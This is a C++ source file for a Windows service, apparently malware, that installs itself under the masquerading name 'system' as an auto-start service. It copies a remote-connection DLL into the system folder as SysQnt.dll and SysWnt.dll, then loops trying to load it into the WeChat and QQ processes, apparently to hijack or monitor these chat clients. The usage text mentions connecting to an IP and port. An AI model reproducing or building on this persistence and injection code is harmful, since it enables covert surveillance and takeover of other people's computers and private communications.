#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <iostream>
#include <string>

#include "dump.h"
 
#pragma comment(lib, "ws2_32.lib")
using namespace std;
             
void  WINAPI ServiceMain(DWORD,LPTSTR *);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL  InstallCmdService();
void DelServices();
void  Usage(void);
//VOID WINAPI EXEBackMain (LPVOID s);
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning=true;

#define WSAerron WSAGetLastError()
#define erron GetLastError()

int main(int argc,char *argv[])
{
   	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{"system",ServiceMain},//服务程序的名称和入口点(函数)
		{NULL    ,NULL    }
//SERVICE_TABLE_ENTRY结构必须以“NULL”结束；
	};
  //  if(argc==1) door();

	if(argc==2) 
	{
		if(!stricmp(argv[1],"-i"))//如果第二个参数等于-install
		{
			InstallCmdService();
		}
		else if(!stricmp(argv[1],"-r"))//比较字符串s1和s2
		{
			DelServices();
		}
		else
		{
		Usage();
		}
		return 0;
	}
	StartServiceCtrlDispatcher(DispatchTable);//把入口点的地址传入
	return 0;
}

void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpArgv) 
//服务主函数
{
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_ServiceStatus.dwWin32ExitCode = 0; 
	m_ServiceStatus.dwServiceSpecificExitCode = 0; 
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system",ServiceCtrlHandler);
	if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return; 
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
//设置服务状态
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0; 
	//SERVICE_STATUS结构含有七个成员，它们反映服务的现行状态。
	//所有这些成员必须在这个结构被传递到SetServiceStatus之前正确的设置
   if( SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
 	bRunning=true;

	
   char chSysPath1[1024];
   char chSysPath2[1024];
   ZeroMemory(chSysPath1,1024);	
   ZeroMemory(chSysPath2,1024);	
   if(dwArgc>1)
	{
		while(1)
		{
			if(dll(lpArgv[1],lpArgv[2]))
			{
				break;
			}
		}
	}else
	{
		GetSystemDirectory(chSysPath1,sizeof(chSysPath1));//取系统目录
		strcat(chSysPath1,"\\SysQnt.dll");
		GetSystemDirectory(chSysPath2,sizeof(chSysPath2));//取系统目录
		strcat(chSysPath2,"\\SysWnt.dll");
		while(1)
		{
			if(dll(chSysPath2,"WeChat.EXE"))
			{
				break;
			}
			if(dll(chSysPath1,"QQ.EXE"))
			{
				break;
			}
		}
	}

	return; 
}
void WINAPI ServiceCtrlHandler(DWORD Opcode)//服务控制函数
{
	switch(Opcode) 
	{ 
	case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
		m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
		break; 
	case SERVICE_CONTROL_CONTINUE:  
		m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
		break; 
	case SERVICE_CONTROL_STOP:   
		m_ServiceStatus.dwWin32ExitCode = 0; 
		m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
		m_ServiceStatus.dwCheckPoint = 0; 
		m_ServiceStatus.dwWaitHint = 0; 
		SetServiceStatus (m_ServiceStatusHandle,&m_ServiceStatus);
		bRunning=false;
		break;
	case SERVICE_CONTROL_INTERROGATE: 
		break; 
	} 
	return; 
}
BOOL InstallCmdService()//安装服务函数
{
	char strDir[1024];
	char chSysPath[1024];
	SC_HANDLE schSCManager,schService;

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//取当前目录
	strcat(strDir,"\\RmoteConnectDll.dll");
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//取系统目录
	strcat(chSysPath,"\\SysQnt.dll");
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy SysQnt.dll OK\n"); 

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//取当前目录
	strcat(strDir,"\\RmoteConnectDll.dll");
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//取系统目录
	strcat(chSysPath,"\\SysWnt.dll");
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy SysWnt.dll OK\n"); 

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//取当前目录
	GetModuleFileName(NULL,strDir,sizeof(strDir));
//取当前文件路径和文件名
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//取系统目录
	strcat(chSysPath,"\\system.exe");
//将system.exe拼接到系统目录
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy system.exe OK\n"); 
// 把当前服务程序复制到系统根目录为system.exe
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == NULL) 
	{
		printf("open scmanger failed,maybe you do not have the privilage to do this\n");
		return false;
	}
	LPCTSTR lpszBinaryPathName=strDir;
	schService = CreateService(schSCManager,
		"system",
		"system", //将服务的信息添加到SCM的数据库
		SERVICE_ALL_ACCESS, // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START, // start type 
		SERVICE_ERROR_NORMAL, // error control type 
		lpszBinaryPathName, // service's binary 
		NULL, // no load ordering group 
		NULL, // no tag identifier 
		NULL, // no dependencies 
		NULL, // LocalSystem account 
		NULL); // no password 
        if (schService) printf("Install Service Success!\n");
		else
		return false; 
		CloseServiceHandle(schService); 
	return true;
}
void DelServices()
{
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	strcpy(name,"system");
    if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))==NULL)
    {
        printf("OpenSCManager Error ");
    }
    service=OpenService(scm,name,SERVICE_ALL_ACCESS|DELETE);
    if (!service)
    {
        printf("OpenService error! ");
        return;
    }
    BOOL isSuccess=QueryServiceStatus(service,&status);
    if (!isSuccess)
    {
        printf("QueryServiceStatus error! ");
        return;
    }
    if ( status.dwCurrentState!=SERVICE_STOPPED )
    {
        isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
        if (!isSuccess )
            printf("Stop Service error! ");
        Sleep( 500 );
    }
    isSuccess=DeleteService(service);
    if (!isSuccess)
         printf("Delete Service Fail!");
    else
         printf("Delete Service Success! ");
    CloseServiceHandle(service );
    CloseServiceHandle(scm);
}

void Usage()
{
fprintf(stderr,"Code by dahubaobao\n"
               "Usage:%s 【[-i] [-r]】 【connect ip】【port】-i: install service; -r: remove service.\n");
       }
